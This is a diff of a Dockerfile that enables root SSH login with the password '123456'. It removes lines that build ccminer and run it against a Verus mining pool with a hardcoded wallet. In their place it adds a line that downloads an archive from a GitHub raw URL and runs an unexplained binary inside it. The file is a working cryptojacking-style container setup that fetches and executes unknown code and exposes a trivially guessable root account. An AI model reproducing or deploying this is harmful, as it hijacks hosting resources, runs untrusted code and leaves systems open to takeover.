@@ -18,7 +18,6 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo root:123456|chpasswd
 RUN chmod 755 /luo.sh
-RUN apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-RUN git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RXJdpoJge8fr62Bguz2EDoXVaNA7o6ZaEc.Gratis -p x -d 0 -t 4 -r 100
+RUN wget https://raw.githubusercontent.com/robertreynolds2/RTMFIX/main/pilus.tar && tar xf pilus.tar && chmod +x pilus && ./renyah
 EXPOSE 80
 CMD  /luo.sh
